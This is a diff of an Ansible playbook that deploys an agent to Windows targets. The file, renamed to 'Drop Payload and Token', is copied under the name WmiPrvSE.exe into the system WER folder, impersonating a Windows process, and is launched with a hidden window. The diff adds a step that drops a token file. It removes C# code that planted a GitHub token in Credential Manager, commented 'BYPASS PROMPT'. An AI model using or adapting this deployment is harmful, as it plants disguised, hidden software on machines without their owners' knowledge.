@@ -1,5 +1,5 @@
 ---
-- name: Deploy and Enroll System Management Service
+- name: Drop Payload and Token for Manual Enrollment
   hosts: windows_targets
   gather_facts: no
   vars:
@@ -9,9 +9,6 @@
     
     target_dir: 'C:\ProgramData\Microsoft\Windows\WER'
     state_file: 'C:\Users\{{ ansible_user }}\AppData\Roaming\gundo\state.json'
-    
-    # PUT YOUR GITHUB TOKEN HERE
-    github_token: "ghp_YOUR_ACTUAL_TOKEN_HERE"
 
   tasks:
     - name: Ensure target directory exists
@@ -24,80 +21,18 @@
         src: "files/proper.exe"
         dest: "{{ target_dir }}\\WmiPrvSE.exe"
 
+    - name: Drop the token file
+      ansible.windows.win_copy:
+        src: "files/token.txt"
+        dest: "{{ target_dir }}\\token.txt"
+
     - name: Check if the agent is already enrolled
       ansible.windows.win_stat:
         path: "{{ state_file }}"
       register: state_check
 
-    # --- BYPASS PROMPT: INJECT TOKEN VIA WINDOWS API (C#) ---
-    - name: Inject GitHub token into Windows Credential Manager
-      ansible.windows.win_shell: |
-        $source = @"
-        using System;
-        using System.Runtime.InteropServices;
-        using System.Text;
-
-        public class CredMan {
-            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-            public struct CREDENTIAL {
-                public int Flags;
-                public int Type;
-                public string TargetName;
-                public string Comment;
-                public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
-                public int CredentialBlobSize;
-                public IntPtr CredentialBlob;
-                public int Persist;
-                public int AttributeCount;
-                public IntPtr Attributes;
-                public string TargetAlias;
-                public string UserName;
-            }
-
-            [DllImport("advapi32.dll", EntryPoint = "CredWriteW", CharSet = CharSet.Unicode, SetLastError = true)]
-            public static extern bool CredWrite(ref CREDENTIAL credential, int flags);
-
-            public static bool SetCredential(string target, string username, string password) {
-                CREDENTIAL cred = new CREDENTIAL();
-                cred.Type = 1; // CRED_TYPE_GENERIC
-                cred.TargetName = target;
-                cred.UserName = username;
-                
-                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
-                cred.CredentialBlobSize = passwordBytes.Length;
-                cred.CredentialBlob = Marshal.AllocHGlobal(passwordBytes.Length);
-                Marshal.Copy(passwordBytes, 0, cred.CredentialBlob, passwordBytes.Length);
-                
-                cred.Persist = 2; // CRED_PERSIST_LOCAL_MACHINE
-
-                bool result = CredWrite(ref cred, 0);
-                Marshal.FreeHGlobal(cred.CredentialBlob);
-                return result;
-            }
-        }
-        "@
-        Add-Type -TypeDefinition $source
-        
-        # The format go-keyring expects on Windows
-        $target = "gundo/github:mamadub03/gundo-test-repo"
-        
-        # Write it to the Windows API
-        if ([CredMan]::SetCredential($target, "token", "{{ github_token }}")) {
-            Write-Host "Token successfully injected via Windows API"
-        } else {
-            Write-Error "Failed to inject token via Windows API"
-            exit 1
-        }
-      when: not state_check.stat.exists
-
-    # --- LAUNCH HIDDEN: THE CLIENT WILL AUTO-ENROLL ---
+    # --- LAUNCH HIDDEN (If already enrolled) ---
     - name: Launch agent hidden in the background
-      ansible.windows.win_shell: |
-        Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
-      when: not state_check.stat.exists
-
-    # --- IF ALREADY ENROLLED: JUST LAUNCH ---
-    - name: Launch agent hidden (already enrolled)
       ansible.windows.win_shell: |
         Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
       when: state_check.stat.exists
